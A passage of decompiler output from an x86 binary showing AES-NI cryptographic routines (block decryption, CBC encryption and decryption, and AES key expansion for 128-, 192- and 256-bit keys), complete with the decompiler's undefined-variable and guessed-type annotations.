      v30 = _mm_loadu_si128(v8);
      v31 = _mm_loadu_si128(v8 + 1);
      v32 = _mm_loadu_si128(v8 + 2);
      v33 = _mm_loadu_si128(v8 + 3);
      v34 = _mm_loadu_si128(v8 + 4);
      v35 = _mm_loadu_si128(v8 + 5);
      v8 += 6;
      v154 = (__m128i)v12;
      _XMM1 = *(_OWORD *)(v24 + v156 - 32);
      _XMM2 = _mm_xor_si128(_mm_xor_si128(v30, v29), v142);
      _XMM3 = _mm_xor_si128(_mm_xor_si128(v31, v29), v145);
      _XMM4 = _mm_xor_si128(_mm_xor_si128(v32, v29), v148);
      _XMM5 = _mm_xor_si128(_mm_xor_si128(v33, v29), v150);
      _XMM6 = _mm_xor_si128(_mm_xor_si128(v34, v29), v152);
      _XMM7 = _mm_xor_si128(_mm_xor_si128(v35, v29), v153);
      __asm
      {
        aesdec  xmm2, xmm1
        aesdec  xmm3, xmm1
        aesdec  xmm4, xmm1
        aesdec  xmm5, xmm1
        aesdec  xmm6, xmm1
        aesdec  xmm7, xmm1
      }
      v49 = v157;
      v13 = ((int (*)(void))loc_408C4E)();
      v10 = _mm_load_si128(&v153);
      v50 = _mm_xor_si128(_XMM2, v142);
      v51 = _mm_xor_si128(_XMM3, v145);
      v52 = _mm_xor_si128(_XMM4, v148);
      v53 = _mm_xor_si128(_XMM5, v150);
      v54 = _mm_xor_si128(_XMM6, v152);
      v55 = _mm_xor_si128(_XMM7, v10);
      v56 = _mm_xor_si128(_mm_load_si128(&v154), v50);
      *(__m128i *)((char *)&v8[-6] + v49) = v50;
      *(__m128i *)((char *)&v8[-5] + v49) = v51;
      *(__m128i *)((char *)&v8[-4] + v49) = v52;
      *(__m128i *)((char *)&v8[-3] + v49) = v53;
      *(__m128i *)((char *)&v8[-2] + v49) = v54;
      v12 = (__m128)_mm_xor_si128(
                      _mm_xor_si128(_mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v56, v51), v52), v53), v54),
                      v55);
      *(__m128i *)((char *)&v8[-1] + v49) = v55;
    }
    while ( (unsigned int)v8 < v13 );
  }
  result = v13 + 96 - (_DWORD)v8;
  if ( result )
  {
    if ( result < 0x20 )
    {
      v87 = *(_DWORD *)(v155 + 240);
      v88 = (__m128)_mm_xor_si128(_mm_loadu_si128(a7), v10);
      v89 = v12;
      _XMM1 = *(_OWORD *)(v155 + 16);
      v91 = (__int128 *)(v155 + 32);
      _XMM2 = _mm_xor_ps((__m128)_mm_xor_si128(_mm_loadu_si128(v8), (__m128i)v88), *(__m128 *)v155);
      do
      {
        __asm { aesdec  xmm2, xmm1 }
        --v87;
        _XMM1 = *v91++;
      }
      while ( v87 );
      __asm { aesdeclast xmm2, xmm1 }
      v94 = _mm_xor_ps(_XMM2, v88);
      v12 = _mm_xor_ps(v89, v94);
      *(__m128 *)((char *)v8 + v157) = v94;
    }
    else if ( result == 32 )
    {
      _BitScanForward(&v95, v11 + 1);
      v96 = (__m128)_mm_xor_si128(_mm_loadu_si128(a7), v10);
      v97 = (__m128)_mm_xor_si128(_mm_loadu_si128(&a7[v95]), (__m128i)v96);
      v98 = (__m128)_mm_xor_si128(_mm_loadu_si128(v8), (__m128i)v96);
      v99 = (__m128)_mm_xor_si128(_mm_loadu_si128(v8 + 1), (__m128i)v97);
      v100 = v157;
      sub_408880(v155, *(_DWORD *)(v155 + 240), v98, (__m128i)v99);
      v101 = _mm_xor_ps(v98, v96);
      v102 = _mm_xor_ps(v99, v97);
      *(__m128 *)((char *)v8 + v100) = v101;
      *(__m128 *)((char *)&v8[1] + v100) = v102;
      v12 = _mm_xor_ps(_mm_xor_ps(v12, v101), v102);
    }
    else if ( result < 0x40 )
    {
      _BitScanForward(&v103, v11 + 1);
      v104 = _mm_loadu_si128(&a7[v103]);
      v105 = _mm_loadu_si128(a7);
      v106 = _mm_loadu_si128(v8);
      v107 = _mm_loadu_si128(v8 + 1);
      v108 = _mm_loadu_si128(v8 + 2);
      v109 = *(_DWORD *)(v155 + 240);
      v154 = (__m128i)v12;
      v110 = (__m128)_mm_xor_si128(v105, v10);
      v111 = (__m128)_mm_xor_si128(v104, (__m128i)v110);
      v112 = (__m128)_mm_xor_si128(v105, (__m128i)v111);
      v113 = (__m128)_mm_xor_si128(v106, (__m128i)v110);
      v114 = (__m128)_mm_xor_si128(v107, (__m128i)v111);
      v115 = (__m128)_mm_xor_si128(v108, (__m128i)v112);
      v116 = v157;
      sub_408960(v155, v109, v113, (__m128i)v114, (__m128i)v115);
      v117 = _mm_load_si128(&v154);
      v118 = (__m128i)_mm_xor_ps(v113, v110);
      v119 = (__m128i)_mm_xor_ps(v114, v111);
      v120 = (__m128i)_mm_xor_ps(v115, v112);
      *(__m128i *)((char *)v8 + v116) = v118;
      *(__m128i *)((char *)&v8[1] + v116) = v119;
      *(__m128i *)((char *)&v8[2] + v116) = v120;
      v12 = (__m128)_mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v117, v118), v119), v120);
    }
    else
    {
      _BitScanForward((unsigned int *)&v58, v11 + 1);
      if ( result == 64 )
      {
        _BitScanForward(&v121, v11 + 3);
        v122 = _mm_loadu_si128(a7);
        v123 = _mm_xor_si128(v122, v10);
        v124 = _mm_loadu_si128(v8);
        v125 = _mm_xor_si128(_mm_loadu_si128(&a7[v58]), v123);
        v126 = _mm_loadu_si128(v8 + 1);
        v127 = (__m128)_mm_xor_si128(v122, v125);
        v144 = (__m128)v123;
        v128 = (__m128)_mm_xor_si128(_mm_loadu_si128(&a7[v121]), (__m128i)v127);
        v147 = (__m128)v125;
        v129 = _mm_loadu_si128(v8 + 2);
        v130 = _mm_loadu_si128(v8 + 3);
        v131 = *(_DWORD *)(v155 + 240);
        v154 = (__m128i)v12;
        v132 = (__m128)_mm_xor_si128(v124, (__m128i)v144);
        v133 = (__m128)_mm_xor_si128(v126, (__m128i)v147);
        v134 = (__m128)_mm_xor_si128(v129, (__m128i)v127);
        v135 = (__m128)_mm_xor_si128(v130, (__m128i)v128);
        v136 = v157;
        sub_408A70(v155, v131, v132, (__m128i)v133, (__m128i)v134, (__m128i)v135);
        v137 = _mm_load_si128(&v154);
        v138 = (__m128i)_mm_xor_ps(v132, v144);
        v139 = (__m128i)_mm_xor_ps(v133, v147);
        v140 = (__m128i)_mm_xor_ps(v134, v127);
        *(__m128i *)((char *)v8 + v136) = v138;
        v141 = (__m128i)_mm_xor_ps(v135, v128);
        *(__m128i *)((char *)&v8[1] + v136) = v139;
        *(__m128i *)((char *)&v8[2] + v136) = v140;
        *(__m128i *)((char *)&v8[3] + v136) = v141;
        v12 = (__m128)_mm_xor_si128(_mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v137, v138), v139), v140), v141);
      }
      else
      {
        _BitScanForward(&v59, v11 + 3);
        v60 = _mm_loadu_si128(a7);
        v143 = _mm_xor_si128(v60, v10);
        v146 = _mm_xor_si128(_mm_loadu_si128(&a7[v58]), v143);
        v149 = _mm_xor_si128(v60, v146);
        v151 = _mm_xor_si128(_mm_loadu_si128(&a7[v59]), v149);
        v152 = _mm_xor_si128(v60, v151);
        v61 = *(__m128i *)(v24 + v156 - 48);
        v62 = _mm_loadu_si128(v8);
        v63 = _mm_loadu_si128(v8 + 1);
        v64 = _mm_loadu_si128(v8 + 2);
        v65 = _mm_loadu_si128(v8 + 3);
        v66 = _mm_loadu_si128(v8 + 4);
        _XMM7 = 0i64;
        v154 = (__m128i)v12;
        _XMM1 = *(_OWORD *)(v24 + v156 - 32);
        _XMM2 = _mm_xor_si128(_mm_xor_si128(v62, v61), v143);
        _XMM3 = _mm_xor_si128(_mm_xor_si128(v63, v61), v146);
        _XMM4 = _mm_xor_si128(_mm_xor_si128(v64, v61), v149);
        _XMM5 = _mm_xor_si128(_mm_xor_si128(v65, v61), v151);
        _XMM6 = _mm_xor_si128(_mm_xor_si128(v66, v61), v152);
        __asm
        {
          aesdec  xmm2, xmm1
          aesdec  xmm3, xmm1
          aesdec  xmm4, xmm1
          aesdec  xmm5, xmm1
          aesdec  xmm6, xmm1
          aesdec  xmm7, xmm1
        }
        v80 = v157;
        result = ((int (*)(void))loc_408C4E)();
        v81 = _mm_xor_si128(_XMM2, v143);
        v82 = _mm_xor_si128(_XMM3, v146);
        v83 = _mm_xor_si128(_XMM4, v149);
        v84 = _mm_xor_si128(_XMM5, v151);
        v85 = _mm_xor_si128(_XMM6, _mm_load_si128(&v152));
        v86 = _mm_xor_si128(_mm_load_si128(&v154), v81);
        *(__m128i *)((char *)v8 + v80) = v81;
        *(__m128i *)((char *)&v8[1] + v80) = v82;
        *(__m128i *)((char *)&v8[2] + v80) = v83;
        *(__m128i *)((char *)&v8[3] + v80) = v84;
        v12 = (__m128)_mm_xor_si128(_mm_xor_si128(_mm_xor_si128(_mm_xor_si128(v86, v82), v83), v84), v85);
        *(__m128i *)((char *)&v8[4] + v80) = v85;
      }
    }
  }
  MEMORY[0] = v12;
  return result;
}
// 40AA18: variable 'v24' is possibly undefined

//----- (0040AF30) --------------------------------------------------------
unsigned int __cdecl sub_40AF30(const __m128i *a1, __m128 *a2, unsigned int a3, int a4, __m128 *a5, int a6)
{
  unsigned int result; // eax
  int v9; // edx
  __m128 v10; // xmm7
  int v11; // ecx
  int v12; // ebx
  unsigned int v14; // eax
  __m128 v15; // xmm7
  __m128 v17; // xmm7
  __int128 *v18; // edx
  bool v20; // cf
  char *v21; // edi
  unsigned int v22; // ecx
  __m128 v23; // xmm2
  __m128 v24; // xmm3
  __m128 v25; // xmm4
  __m128 v26; // xmm5
  __m128 v27; // xmm6
  __m128 v28; // xmm7
  __m128 v29; // xmm3
  __m128 v30; // xmm4
  __m128 v31; // xmm5
  __m128 v32; // xmm6
  __m128 v33; // xmm0
  __m128 v34; // xmm7
  unsigned int v35; // eax
  char v36; // cc
  unsigned int v37; // eax
  __m128 v38; // xmm2
  __m128 v39; // xmm2
  __m128 v40; // xmm6
  __m128 v41; // xmm3
  __m128 v42; // xmm4
  __m128 v43; // xmm5
  __m128 v44; // xmm6
  __m128 v45; // xmm2
  __m128 v46; // xmm3
  __m128 v47; // xmm4
  __m128 v48; // xmm5
  __m128 v49; // xmm6
  __m128 v50; // xmm0
  __int128 *v52; // edx
  __m128 v55; // xmm1
  __m128 v56; // xmm0
  __m128 v57; // xmm2
  __m128 v58; // [esp+0h] [ebp-10h] BYREF
  __m128 *retaddr; // [esp+10h] [ebp+0h]

  result = a3;
  v9 = a4;
  if ( a3 )
  {
    v10 = *a5;
    v11 = *(_DWORD *)(a4 + 240);
    retaddr = &v58;
    v12 = v11;
    if ( a6 )
    {
      _XMM2 = *a5;
      if ( a3 < 0x10 )
        goto LABEL_10;
      v14 = a3 - 16;
      while ( 1 )
      {
        do
        {
          v15 = *(__m128 *)a1++;
          _XMM1 = *(_OWORD *)(v9 + 16);
          v17 = _mm_xor_ps(v15, *(__m128 *)v9);
          v18 = (__int128 *)(v9 + 32);
          _XMM2 = _mm_xor_ps(_XMM2, v17);
          do
          {
            __asm { aesenc  xmm2, xmm1 }
            --v11;
            _XMM1 = *v18++;
          }
          while ( v11 );
          __asm { aesenclast xmm2, xmm1 }
          v11 = v12;
          v9 = a4;
          *a2++ = _XMM2;
          v20 = v14 < 0x10;
          v14 -= 16;
        }
        while ( !v20 );
        result = v14 + 16;
        if ( !result )
          break;
LABEL_10:
        qmemcpy(a2, a1, result);
        v21 = (char *)a2 + result;
        v22 = 16 - result;
        v14 = 0;
        memset(v21, 0, v22);
        a2 = (__m128 *)&v21[v22 - 16];
        v11 = v12;
        a1 = (const __m128i *)a2;
        v9 = a4;
      }
      v10 = _XMM2;
      goto LABEL_31;
    }
    if ( a3 > 0x50 )
    {
      v58 = *a5;
      while ( 1 )
      {
        v23 = (__m128)_mm_loadu_si128(a1);
        v24 = (__m128)_mm_loadu_si128(a1 + 1);
        v25 = (__m128)_mm_loadu_si128(a1 + 2);
        v26 = (__m128)_mm_loadu_si128(a1 + 3);
        v27 = (__m128)_mm_loadu_si128(a1 + 4);
        v28 = (__m128)_mm_loadu_si128(a1 + 5);
        sub_408BE0(v9, v11, v23, (__m128i)v24, (__m128i)v25, (__m128i)v26, (__m128i)v27, (__m128i)v28);
        v29 = _mm_xor_ps(v24, *(__m128 *)a1);
        v30 = _mm_xor_ps(v25, (__m128)a1[1]);
        v31 = _mm_xor_ps(v26, (__m128)a1[2]);
        v32 = _mm_xor_ps(v27, (__m128)a1[3]);
        v33 = (__m128)a1[5];
        v34 = _mm_xor_ps(v28, (__m128)a1[4]);
        *a2 = _mm_xor_ps(v23, v58);
        a2[1] = v29;
        a1 += 6;
        a2[2] = v30;
        v11 = v12;
        a2[3] = v31;
        v9 = a4;
        a2[4] = v32;
        a2 += 5;
        v36 = v35 <= 0x60;
        v37 = v35 - 96;
        if ( v36 )
          break;
        v58 = v33;
        *a2++ = v34;
      }
      v38 = v34;
      v10 = v33;
      v36 = ((int)(v37 + 80) < 0) ^ __OFADD__(80, v37) | (v37 == -80);
      result = v37 + 80;
      if ( v36 )
        goto LABEL_28;
      *a2++ = v38;
    }
    v39 = *(__m128 *)a1;
    v40 = *(__m128 *)a1;
    if ( result <= 0x10 )
    {
      v50 = *(__m128 *)v9;
      _XMM1 = *(_OWORD *)(v9 + 16);
      v52 = (__int128 *)(v9 + 32);
      _XMM2 = _mm_xor_ps(v39, v50);
      do
      {
        __asm { aesdec  xmm2, xmm1 }
        --v11;
        _XMM1 = *v52++;
      }
      while ( v11 );
      __asm { aesdeclast xmm2, xmm1 }
      v38 = _mm_xor_ps(_XMM2, v10);
      v10 = *(__m128 *)a1;
      LOBYTE(result) = result - 16;
    }
    else
    {
      v41 = (__m128)a1[1];
      if ( result <= 0x20 )
      {
        sub_408880(v9, v11, v39, (__m128i)v41);
        *a2 = _mm_xor_ps(v39, v10);
        v38 = _mm_xor_ps(v41, v40);
        ++a2;
        v10 = v41;
        LOBYTE(result) = result - 32;
      }
      else
      {
        v42 = (__m128)a1[2];
        if ( result <= 0x30 )
        {
          sub_408960(v9, v11, v39, (__m128i)v41, (__m128i)v42);
          *a2 = _mm_xor_ps(v39, v10);
          v38 = _mm_xor_ps(v42, v41);
          a2[1] = _mm_xor_ps(v41, v40);
          a2 += 2;
          v10 = (__m128)a1[2];
          LOBYTE(result) = result - 48;
        }
        else
        {
          v43 = (__m128)a1[3];
          if ( result <= 0x40 )
          {
            sub_408A70(v9, v11, v39, (__m128i)v41, (__m128i)v42, (__m128i)v43);
            v55 = (__m128)a1[1];
            v56 = (__m128)a1[2];
            v57 = _mm_xor_ps(v39, v10);
            v10 = (__m128)a1[3];
            *a2 = v57;
            a2[1] = _mm_xor_ps(v41, v40);
            a2[2] = _mm_xor_ps(v42, v55);
            a2 += 3;
            v38 = _mm_xor_ps(v43, v56);
            LOBYTE(result) = result - 64;
          }
          else
          {
            v44 = (__m128)a1[4];
            v58 = v10;
            v45 = *(__m128 *)a1;
            sub_408BE0(v9, v11, *(__m128 *)a1, (__m128i)v41, (__m128i)v42, (__m128i)v43, (__m128i)v44, (__m128i)0i64);
            v46 = _mm_xor_ps(v41, *(__m128 *)a1);
            v47 = _mm_xor_ps(v42, (__m128)a1[1]);
            v48 = _mm_xor_ps(v43, (__m128)a1[2]);
            v10 = (__m128)a1[4];
            v49 = _mm_xor_ps(v44, (__m128)a1[3]);
            *a2 = _mm_xor_ps(v45, v58);
            a2[1] = v46;
            a2[2] = v47;
            a2[3] = v48;
            a2 += 4;
            v38 = v49;
            LOBYTE(result) = result - 80;
          }
        }
      }
    }
LABEL_28:
    result &= 0xFu;
    if ( result )
    {
      v58 = v38;
      qmemcpy(a2, &v58, 16 - result);
      v58 = v38;
    }
    else
    {
      *a2 = v38;
    }
LABEL_31:
    *a5 = v10;
  }
  return result;
}
// 40B0A3: variable 'v35' is possibly undefined
// 40B155: variable 'result' is possibly undefined

//----- (0040B2C0) --------------------------------------------------------
int __usercall sub_40B2C0@<eax>(int a1@<eax>, __m128i *a2@<edx>, int a3@<ecx>, __m128 a4@<xmm5>)
{
  __m128i *v5; // edx
  int v6; // ebp
  _OWORD *v10; // edx
  _OWORD *v12; // edx
  _OWORD *v14; // edx
  _OWORD *v16; // edx
  _OWORD *v18; // edx
  _OWORD *v20; // edx
  _OWORD *v22; // edx
  _OWORD *v24; // edx
  _OWORD *v26; // edx
  __m128 *v27; // edx
  __int32 v28; // ecx
  __m128i v29; // xmm5
  int v30; // ecx
  __m128i v32; // xmm2
  __m128i v35; // xmm3
  __m128i v36; // xmm2
  __m128i v37; // xmm3
  __m128i v38; // xmm2
  __m128i v43; // xmm3
  __m128i v44; // xmm2
  __m128i v45; // xmm3
  __m128i v46; // xmm2
  __m128i v47; // xmm0
  __m128i v48; // xmm2
  __m128i v51; // xmm3
  __m128i v52; // xmm2
  __m128i v53; // xmm3
  __m128i v54; // xmm2
  __m128 v57; // xmm0
  __m128 *v59; // edx
  _OWORD *v61; // edx
  int v62; // ecx
  __m128 *v64; // edx
  _OWORD *v66; // edx
  int v67; // ecx
  __m128 *v69; // edx
  _OWORD *v71; // edx
  int v72; // ecx
  __m128 *v74; // edx
  __m128i *v75; // edx
  __int32 v76; // ecx
  __m128i v77; // xmm5
  int v79; // ecx
  __m128i v80; // xmm1
  __m128i v83; // xmm3
  __m128i v84; // xmm0
  __m128i v85; // xmm3
  __m128i v86; // xmm0
  __m128i v87; // xmm0
  __m128i v88; // xmm3
  _OWORD *m128i_i8; // edx
  _OWORD *v94; // edx
  _OWORD *v96; // edx
  _OWORD *v98; // edx
  _OWORD *v100; // edx
  _OWORD *v102; // edx
  _OWORD *v104; // edx
  _OWORD *v106; // edx
  _OWORD *v108; // edx
  _OWORD *v110; // edx
  _OWORD *v112; // edx
  _OWORD *v114; // edx
  _OWORD *v116; // edx
  __m128 *v117; // edx
  __int32 v118; // ecx
  __m128i si128; // xmm5
  int v121; // ecx
  __m128i v122; // xmm1
  __m128i v125; // xmm3
  __m128i v126; // xmm0
  __m128i v127; // xmm3
  __m128i v128; // xmm0
  __m128i v132; // xmm3
  __m128i v133; // xmm1
  __m128i v134; // xmm3
  __m128i v135; // xmm1

  if ( !a1 || !a2 )
    return -1;
  _XMM0 = *(__m128 *)a1;
  v5 = a2 + 1;
  v6 = *(&dword_73C6D0 + 1) & 0x10000800;
  switch ( a3 )
  {
    case 256:
      _XMM2 = *(_OWORD *)(a1 + 16);
      m128i_i8 = v5[1].m128i_i8;
      if ( v6 == 0x10000000 )
      {
        si128 = _mm_load_si128((const __m128i *)dword_40B8C0);
        _XMM4 = _mm_load_si128((const __m128i *)&dword_40B8C0[8]);
        v121 = 7;
        *(m128i_i8 - 2) = _XMM0;
        v122 = (__m128i)_XMM2;
        *(m128i_i8 - 1) = _XMM2;
        while ( 1 )
        {
          _XMM2 = _mm_shuffle_epi8((__m128i)_XMM2, si128);
          __asm { aesenclast xmm2, xmm4 }
          v125 = (__m128i)_XMM0;
          v126 = _mm_slli_si128((__m128i)_XMM0, 4);
          v127 = _mm_xor_si128(v125, v126);
          v128 = _mm_slli_si128(v126, 4);
          _XMM4 = _mm_slli_epi32(_XMM4, 1u);
          _XMM0 = (__m128)_mm_xor_si128(_mm_xor_si128(_mm_slli_si128(v128, 4), _mm_xor_si128(v127, v128)), _XMM2);
          *m128i_i8 = _XMM0;
          if ( !--v121 )
            break;
          _XMM2 = _mm_shuffle_epi32((__m128i)_XMM0, 255);
          _XMM3 = 0i64;
          __asm { aesenclast xmm2, xmm3 }
          v132 = v122;
          v133 = _mm_slli_si128(v122, 4);
          v134 = _mm_xor_si128(v132, v133);
          v135 = _mm_slli_si128(v133, 4);
          _XMM2 = (__int128)_mm_xor_si128(_XMM2, _mm_xor_si128(_mm_slli_si128(v135, 4), _mm_xor_si128(v134, v135)));
          m128i_i8[1] = _XMM2;
          m128i_i8 += 2;
          v122 = (__m128i)_XMM2;
        }
        *((_DWORD *)m128i_i8 + 4) = 13;
      }
      else
      {
        *(m128i_i8 - 2) = _XMM0;
        *(m128i_i8 - 1) = _XMM2;
        __asm { aeskeygenassist xmm1, xmm2, 1 }
        _XMM0 = sub_40B6E6(_XMM0, _XMM1, (__m128)0i64);
        __asm { aeskeygenassist xmm1, xmm0, 1 }
        sub_40B700(v94, *(_OWORD *)&_XMM0);
        __asm { aeskeygenassist xmm1, xmm2, 2 }
        sub_40B6E0(v96, _XMM2);
        __asm { aeskeygenassist xmm1, xmm0, 2 }
        sub_40B700(v98, *(_OWORD *)&_XMM0);
        __asm { aeskeygenassist xmm1, xmm2, 4 }
        sub_40B6E0(v100, _XMM2);
        __asm { aeskeygenassist xmm1, xmm0, 4 }
        sub_40B700(v102, *(_OWORD *)&_XMM0);
        __asm { aeskeygenassist xmm1, xmm2, 8 }
        sub_40B6E0(v104, _XMM2);
        __asm { aeskeygenassist xmm1, xmm0, 8 }
        sub_40B700(v106, *(_OWORD *)&_XMM0);
        __asm { aeskeygenassist xmm1, xmm2, 10h }
        sub_40B6E0(v108, _XMM2);
        __asm { aeskeygenassist xmm1, xmm0, 10h }
        sub_40B700(v110, *(_OWORD *)&_XMM0);
        __asm { aeskeygenassist xmm1, xmm2, 20h ; ' ' }
        sub_40B6E0(v112, _XMM2);
        __asm { aeskeygenassist xmm1, xmm0, 20h ; ' ' }
        sub_40B700(v114, *(_OWORD *)&_XMM0);
        __asm { aeskeygenassist xmm1, xmm2, 40h ; '@' }
        sub_40B6E0(v116, _XMM2);
        *v117 = _XMM0;
        v117[1].m128_i32[0] = v118;
      }
      return 0;
    case 192:
      _XMM2 = (__m128)_mm_loadl_epi64((const __m128i *)(a1 + 16));
      if ( v6 == 0x10000000 )
      {
        v77 = _mm_load_si128((const __m128i *)&dword_40B8C0[4]);
        _XMM4 = _mm_load_si128((const __m128i *)&dword_40B8C0[8]);
        v79 = 8;
        v5[-1] = (__m128i)_XMM0;
        do
        {
          v5->m128i_i64[0] = _XMM2.m128_u64[0];
          v80 = (__m128i)_XMM2;
          _XMM2 = _mm_shuffle_epi8((__m128i)_XMM2, v77);
          __asm { aesenclast xmm2, xmm4 }
          _XMM4 = _mm_slli_epi32(_XMM4, 1u);
          v5 = (__m128i *)((char *)v5 + 24);
          v83 = (__m128i)_XMM0;
          v84 = _mm_slli_si128((__m128i)_XMM0, 4);
          v85 = _mm_xor_si128(v83, v84);
          v86 = _mm_slli_si128(v84, 4);
          v87 = _mm_xor_si128(_mm_slli_si128(v86, 4), _mm_xor_si128(v85, v86));
          v88 = _mm_xor_si128(_mm_xor_si128(_mm_shuffle_epi32(v87, 255), v80), _mm_slli_si128(v80, 4));
          _XMM0 = (__m128)_mm_xor_si128(v87, _XMM2);
          _XMM2 = (__m128)_mm_xor_si128(_XMM2, v88);
          v5[-1] = (__m128i)_XMM0;
          --v79;
        }
        while ( v79 );
        v5[2].m128i_i32[0] = 11;
      }
      else
      {
        v5[-1] = (__m128i)_XMM0;
        __asm { aeskeygenassist xmm1, xmm2, 1 }
        v57 = (__m128)sub_40B540(_XMM0, _XMM1, (__m128)0i64);
        __asm { aeskeygenassist xmm1, xmm2, 2 }
        sub_40B580(v59, v57, _XMM2, a4);
        __asm { aeskeygenassist xmm1, xmm2, 4 }
        sub_40B530(v61, v62, *(_OWORD *)&v57);
        __asm { aeskeygenassist xmm1, xmm2, 8 }
        sub_40B580(v64, v57, _XMM2, a4);
        __asm { aeskeygenassist xmm1, xmm2, 10h }
        sub_40B530(v66, v67, *(_OWORD *)&v57);
        __asm { aeskeygenassist xmm1, xmm2, 20h ; ' ' }
        sub_40B580(v69, v57, _XMM2, a4);
        __asm { aeskeygenassist xmm1, xmm2, 40h ; '@' }
        sub_40B530(v71, v72, *(_OWORD *)&v57);
        __asm { aeskeygenassist xmm1, xmm2, 80h ; '' }
        sub_40B580(v74, v57, _XMM2, a4);
        *v75 = (__m128i)v57;
        v75[3].m128i_i32[0] = v76;
      }
      return 0;
    case 128:
      if ( v6 == 0x10000000 )
      {
        v29 = _mm_load_si128((const __m128i *)dword_40B8C0);
        v30 = 8;
        _XMM4 = _mm_load_si128((const __m128i *)&dword_40B8C0[8]);
        v32 = *(__m128i *)a1;
        v5[-1] = (__m128i)_XMM0;
        do
        {
          _XMM0 = _mm_shuffle_epi8((__m128i)_XMM0, v29);
          __asm { aesenclast xmm0, xmm4 }
          _XMM4 = _mm_slli_epi32(_XMM4, 1u);
          ++v5;
          v35 = v32;
          v36 = _mm_slli_si128(v32, 4);
          v37 = _mm_xor_si128(v35, v36);
          v38 = _mm_slli_si128(v36, 4);
          _XMM0 = (__m128)_mm_xor_si128(_XMM0, _mm_xor_si128(_mm_slli_si128(v38, 4), _mm_xor_si128(v37, v38)));
          v5[-1] = (__m128i)_XMM0;
          v32 = (__m128i)_XMM0;
          --v30;
        }
        while ( v30 );
        _XMM4 = _mm_load_si128((const __m128i *)&dword_40B8C0[12]);
        _XMM0 = _mm_shuffle_epi8((__m128i)_XMM0, v29);
        __asm { aesenclast xmm0, xmm4 }
        _XMM4 = _mm_slli_epi32(_XMM4, 1u);
        v43 = v32;
        v44 = _mm_slli_si128(v32, 4);
        v45 = _mm_xor_si128(v43, v44);
        v46 = _mm_slli_si128(v44, 4);
        v47 = _mm_xor_si128(_XMM0, _mm_xor_si128(_mm_slli_si128(v46, 4), _mm_xor_si128(v45, v46)));
        *v5 = v47;
        v48 = v47;
        _XMM0 = _mm_shuffle_epi8(v47, v29);
        __asm { aesenclast xmm0, xmm4 }
        v51 = v48;
        v52 = _mm_slli_si128(v48, 4);
        v53 = _mm_xor_si128(v51, v52);
        v54 = _mm_slli_si128(v52, 4);
        v5[1] = _mm_xor_si128(_XMM0, _mm_xor_si128(_mm_slli_si128(v54, 4), _mm_xor_si128(v53, v54)));
        v5[6].m128i_i32[0] = 9;
      }
      else
      {
        v5[-1] = (__m128i)_XMM0;
        __asm { aeskeygenassist xmm1, xmm0, 1 }
        _XMM0 = sub_40B3B6(_XMM0, _XMM1, (__m128)0i64);
        __asm { aeskeygenassist xmm1, xmm0, 2 }
        sub_40B3B0(v10, *(_OWORD *)&_XMM0);
        __asm { aeskeygenassist xmm1, xmm0, 4 }
        sub_40B3B0(v12, *(_OWORD *)&_XMM0);
        __asm { aeskeygenassist xmm1, xmm0, 8 }
        sub_40B3B0(v14, *(_OWORD *)&_XMM0);
        __asm { aeskeygenassist xmm1, xmm0, 10h }
        sub_40B3B0(v16, *(_OWORD *)&_XMM0);
        __asm { aeskeygenassist xmm1, xmm0, 20h ; ' ' }
        sub_40B3B0(v18, *(_OWORD *)&_XMM0);
        __asm { aeskeygenassist xmm1, xmm0, 40h ; '@' }
        sub_40B3B0(v20, *(_OWORD *)&_XMM0);
        __asm { aeskeygenassist xmm1, xmm0, 80h ; '' }
        sub_40B3B0(v22, *(_OWORD *)&_XMM0);
        __asm { aeskeygenassist xmm1, xmm0, 1Bh }
        sub_40B3B0(v24, *(_OWORD *)&_XMM0);
        __asm { aeskeygenassist xmm1, xmm0, 36h ; '6' }
        sub_40B3B0(v26, *(_OWORD *)&_XMM0);
        *v27 = _XMM0;
        v27[5].m128_i32[0] = v28;
      }
      return 0;
  }
  return -2;
}
// 40B346: variable 'v10' is possibly undefined
// 40B351: variable 'v12' is possibly undefined
// 40B35C: variable 'v14' is possibly undefined
// 40B367: variable 'v16' is possibly undefined
// 40B372: variable 'v18' is possibly undefined
// 40B37D: variable 'v20' is possibly undefined
// 40B388: variable 'v22' is possibly undefined
// 40B393: variable 'v24' is possibly undefined
// 40B39E: variable 'v26' is possibly undefined
// 40B3A3: variable 'v27' is possibly undefined
// 40B3A6: variable 'v28' is possibly undefined
// 40B4DB: variable 'v59' is possibly undefined
// 40B4E6: variable 'v61' is possibly undefined
// 40B4E6: variable 'v62' is possibly undefined
// 40B4F1: variable 'v64' is possibly undefined
// 40B4FC: variable 'v66' is possibly undefined
// 40B4FC: variable 'v67' is possibly undefined
// 40B507: variable 'v69' is possibly undefined
// 40B512: variable 'v71' is possibly undefined
// 40B512: variable 'v72' is possibly undefined
// 40B51D: variable 'v74' is possibly undefined
// 40B522: variable 'v75' is possibly undefined
// 40B525: variable 'v76' is possibly undefined
// 40B651: variable 'v94' is possibly undefined
// 40B65C: variable 'v96' is possibly undefined
// 40B667: variable 'v98' is possibly undefined
// 40B672: variable 'v100' is possibly undefined
// 40B67D: variable 'v102' is possibly undefined
// 40B688: variable 'v104' is possibly undefined
// 40B693: variable 'v106' is possibly undefined
// 40B69E: variable 'v108' is possibly undefined
// 40B6A9: variable 'v110' is possibly undefined
// 40B6B4: variable 'v112' is possibly undefined
// 40B6BF: variable 'v114' is possibly undefined
// 40B6CA: variable 'v116' is possibly undefined
// 40B6CF: variable 'v117' is possibly undefined
// 40B6D2: variable 'v118' is possibly undefined
// 40B8C0: using guessed type int dword_40B8C0[16];
// 73C6D0: using guessed type int dword_73C6D0;

//----- (0040B3B0) --------------------------------------------------------
int __usercall sub_40B3B0@<eax>(_OWORD *a1@<edx>, __int128 a2@<xmm0>)
{
  *a1 = a2;
  return sub_40B3B6();
}
// 40B3B6: using guessed type int sub_40B3B6(void);

//----- (0040B3B6) --------------------------------------------------------
__m128 __usercall sub_40B3B6@<xmm0>(__m128 a1@<xmm0>, __m128 a2@<xmm1>, __m128 a3@<xmm4>)
{
  __m128 v3; // xmm4
  __m128 v4; // xmm0

  v3 = _mm_shuffle_ps(a3, a1, 16);
  v4 = _mm_xor_ps(a1, v3);
  return _mm_xor_ps(_mm_xor_ps(v4, _mm_shuffle_ps(v3, v4, 140)), _mm_shuffle_ps(a2, a2, 255));
}

//----- (0040B530) --------------------------------------------------------
int __usercall sub_40B530@<eax>(_OWORD *a1@<edx>, int a2@<ecx>, __int128 a3@<xmm0>)
{
  *a1 = a3;
